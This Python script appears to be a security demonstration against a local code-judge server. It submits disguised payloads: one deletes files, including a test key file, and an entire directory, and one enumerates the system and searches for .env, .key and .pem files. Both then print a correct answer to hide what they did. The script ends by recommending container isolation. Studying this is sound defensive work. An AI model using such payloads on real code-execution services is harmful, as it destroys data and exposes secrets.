import requests
import json
import os
from create_test_files import create_test_files

def test_security_vulnerability():
    """Demonstrate security vulnerability in current judge system"""
    
    print("🚨 SECURITY VULNERABILITY DEMONSTRATION 🚨")
    print("=" * 60)
    
    # Create test files first
    print("\n1. Creating test files...")
    create_test_files()
    
    # Check files exist
    print("\n2. Verifying files exist before attack...")
    test_files = [
        "test_security/important_data.txt",
        "test_security/user_database.db", 
        "test_security/config.json",
        "test_security/secret_key.pem"
    ]
    
    files_before = []
    for file_path in test_files:
        if os.path.exists(file_path):
            files_before.append(file_path)
            print(f"✅ EXISTS: {file_path}")
        else:
            print(f"❌ NOT FOUND: {file_path}")
    
    # Malicious payload
    malicious_payload = {
        "code": '''
import os
import shutil

# Malicious file deletion
files_to_delete = [
    "test_security/important_data.txt",
    "test_security/user_database.db", 
    "test_security/config.json",
    "test_security/secret_key.pem"
]

print("🚨 EXECUTING MALICIOUS CODE...")

for file_path in files_to_delete:
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"DELETED: {file_path}")
    except Exception as e:
        print(f"Error: {e}")

# Try to delete entire directory
try:
    if os.path.exists("test_security"):
        shutil.rmtree("test_security")
        print("DELETED ENTIRE DIRECTORY!")
except Exception as e:
    print(f"Error deleting directory: {e}")

# Normal output to hide attack
a, b = map(int, input().split())
print(a + b)
        ''',
        "language": "python",
        "test_cases": [
            {"input": "2 3", "expected_output": "5"}
        ]
    }
    
    print("\n3. Sending malicious payload to judge...")
    print("   (This will execute file deletion code!)")
    
    try:
        # Send to local judge endpoint
        response = requests.post(
            "http://localhost:8000/judge", 
            json=malicious_payload,
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"\n✅ Judge Response Status: {result.get('status', 'unknown')}")
            
            # Show results
            if 'results' in result and result['results']:
                for i, test_result in enumerate(result['results'], 1):
                    print(f"\nTest Case {i} Output:")
                    print(f"  Status: {test_result['status']}")
                    print(f"  Output: {test_result['actual_output']}")
        else:
            print(f"❌ Request failed: {response.status_code}")
            print(f"Response: {response.text}")
            
    except Exception as e:
        print(f"❌ Error sending request: {e}")
    
    # Check files after attack
    print("\n4. Checking files after attack...")
    files_after = []
    for file_path in test_files:
        if os.path.exists(file_path):
            files_after.append(file_path)
            print(f"✅ STILL EXISTS: {file_path}")
        else:
            print(f"🚨 DELETED: {file_path}")
    
    # Summary
    print("\n" + "=" * 60)
    print("📊 ATTACK SUMMARY:")
    print(f"Files before attack: {len(files_before)}")
    print(f"Files after attack: {len(files_after)}")
    print(f"Files deleted: {len(files_before) - len(files_after)}")
    
    if len(files_after) < len(files_before):
        print("🚨 SECURITY BREACH CONFIRMED!")
        print("   Malicious code successfully deleted files!")
        print("   This demonstrates why Docker isolation is necessary!")
    else:
        print("✅ Files protected (possibly by filesystem permissions)")
    
    print("\n💡 SOLUTION: Use Docker containers for isolation!")

def test_system_info_gathering():
    """Test information gathering attack"""
    
    print("\n🔍 TESTING INFORMATION GATHERING ATTACK")
    print("=" * 50)
    
    info_payload = {
        "code": '''
import os
import socket
import platform

print("=== SYSTEM INFORMATION ===")
print(f"Current Directory: {os.getcwd()}")
print(f"Python Version: {platform.python_version()}")
print(f"Hostname: {socket.gethostname()}")
print(f"Operating System: {platform.system()}")

# List files in current directory
print("\\nFiles in current directory:")
for item in os.listdir("."):
    print(f"  {item}")

# Check for sensitive files
sensitive_files = [".env", "config.py", "database.db", "*.key", "*.pem"]
print("\\nLooking for sensitive files...")
for pattern in sensitive_files:
    try:
        import glob
        matches = glob.glob(pattern)
        if matches:
            print(f"Found {pattern}: {matches}")
    except:
        pass

# Normal output
a, b = map(int, input().split())
print(a + b)
        ''',
        "language": "python",
        "test_cases": [
            {"input": "5 7", "expected_output": "12"}
        ]
    }
    
    try:
        response = requests.post(
            "http://localhost:8000/judge", 
            json=info_payload,
            timeout=30
        )
        
        if response.status_code == 200:
            result = response.json()
            print(f"Judge Response Status: {result.get('status', 'unknown')}")
            
            if 'results' in result and result['results']:
                for i, test_result in enumerate(result['results'], 1):
                    print(f"\n🚨 LEAKED INFORMATION:")
                    print(test_result['actual_output'])
        else:
            print(f"Request failed: {response.status_code}")
            
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("⚠️  WARNING: This script demonstrates security vulnerabilities!")
    print("   Only run this in a safe test environment!")
    print("   Make sure your judge server is running on localhost:8000")
    
    choice = input("\nContinue with security demo? (yes/no): ").lower()
    
    if choice == 'yes':
        test_security_vulnerability()
        test_system_info_gathering()
        
        print("\n🔒 RECOMMENDATION:")
        print("  1. Implement Docker containers for code execution")
        print("  2. Use resource limits (memory, CPU, time)")
        print("  3. Disable network access in containers")
        print("  4. Use read-only filesystems")
        print("  5. Run with minimal privileges")
    else:
        print("Demo cancelled.")